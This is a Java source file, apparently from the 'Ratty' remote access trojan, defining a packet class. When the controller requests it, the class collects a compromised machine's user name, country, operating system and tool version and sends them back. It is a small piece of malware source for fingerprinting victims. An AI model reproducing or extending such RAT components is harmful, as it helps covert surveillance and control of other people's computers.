package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.Ratty;

public final class InformationPacket extends AbstractPingPongPacket {
	
	private String name, location, os, version;
	
	public InformationPacket(final String name, final String location, final String os, final String version) {
		this.name = name;
		this.location = location;
		this.os = os;
		this.version = version;
		
		type = DATA;
	}
	
	public InformationPacket() {
		this("", "", "", "");
		
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUTF(name);
		connection.writeUTF(location);
		connection.writeUTF(os);
		connection.writeUTF(version);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		name = connection.readUTF();
		location = connection.readUTF();
		os = connection.readUTF();
		version = connection.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		name = System.getProperty("user.name");
		location = System.getProperty("user.country");
		os = System.getProperty("os.name");
		version = Ratty.VERSION;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getLocation() {
		return location;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
}
